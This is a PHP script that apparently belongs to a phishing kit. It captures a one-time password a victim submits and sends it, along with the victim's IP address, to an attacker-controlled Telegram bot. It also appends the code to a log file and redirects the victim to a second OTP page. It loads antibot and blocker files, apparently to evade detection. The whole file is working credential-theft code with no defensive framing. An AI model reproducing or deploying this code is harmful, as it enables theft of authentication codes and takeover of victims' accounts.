<?php 
error_reporting(0);
session_start();
include("../config/antibot.php");
include("../config/antibots.php");
include("../config/antibotsulit.php");
include("../config/blocker.php");
include("../config/bt.php");
include("../config/function.php");
include("../settings/config.php");
$otp1 = ($_POST['otp1']);
$time1 = date('M d - h:i:s A');
$mesg = "[$ip2] - O T P 1 - [$time1]\nO T P 1: $otp1\r\n==========================\n";
antibot($mesg);
$request_params = [
    'chat_id' => $user_id,
    'text' => $mesg
];
$request_url = 'https://api.telegram.org/bot'.$token.'/sendMessage?'.http_build_query($request_params);
file_get_contents($request_url);

$seen = "<font color='#FF00FF' style='font-style:courier;' size='2'>| OTP # 1 : ".$otp1."  |  IP ADDRESS : ".$ip2."</font><br>";
$flogs = fopen("../lib/otp.php","a");
fwrite($flogs, $seen);
fclose($flogs);


header("location: ../otp2.php");
?>